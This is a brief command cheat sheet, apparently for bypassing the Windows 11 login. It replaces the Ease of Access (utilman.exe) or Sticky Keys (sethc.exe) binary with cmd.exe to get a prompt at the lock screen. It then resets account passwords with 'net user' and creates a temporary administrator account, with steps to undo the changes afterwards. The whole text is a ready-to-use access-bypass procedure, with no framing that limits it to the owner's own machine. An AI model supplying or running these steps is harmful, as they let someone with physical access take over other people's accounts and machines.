# W11 pass-crack

## Switch cmd to ease of access

```bash
c:
cd windows/system32
mv utilman.exe utilman.old
cp cmd.exe utilman.exe
exit
-
cd windows\system32
del utilman.exe
mv utilman.old utilman.exe

______________________________________
c:
cd windows/system32
mv sethc.exe sethc.exe.bak
cp cmd.exe sethc.exe
exit
-
cd windows\system32
del sethc.exe
mv sethc.exe.bak sethc.exe
```

## Re-assigning pass to existing acc

```bash
net user
-- net user <username>
-- net user <username> /active:yes
net user <username> *
Enter new password twice to confirm and type "exit" and press enter

----------- creating new acc with pass
net user
net user <username> <pass>

______________________________________
c:
cd windows/system32

net user temp <password> /add
net localgroup administrators temp /add

Log Out and Log In as the Temporary User
Settings > Accounts > Sign-in options > Password > Change

net localgroup administrators temp /delete     # remove admin rights
net user temp /delete     # delete user account
```
